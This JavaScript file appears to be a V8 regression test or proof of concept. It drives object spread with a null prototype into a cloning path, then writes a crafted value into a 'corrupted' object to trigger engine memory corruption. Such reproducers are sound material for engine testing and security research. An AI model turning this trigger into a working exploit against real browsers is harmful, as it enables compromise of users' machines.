// Create an object with a larger than usual instance size and a non-empty property array.
let a = {p0: 1, p1: 1, p2: 1, p3: 1, p4: 1, p5: 1, p6: 1, p7: 1, p8: 1};
a.p9 = 1;

// Generalize all fields to tagged.
function throwaway() {
  return {...a, __proto__: null};
}

for (let i = 0; i < 2; ++i) {
  for (let j = 0; j < 100; ++j)  // IC
    throwaway();

  for (let key in a) a[key] = {};
}

function func() {
  // Set the prototype to null to trigger the kDifferentMap clone mode.
  return {...a, __proto__: null};
}

for (let j = 0; j < 100; ++j)  // IC
  func();

corrupted = func();
corrupted.p9 = 0x42424242 >> 1;
corrupted[0];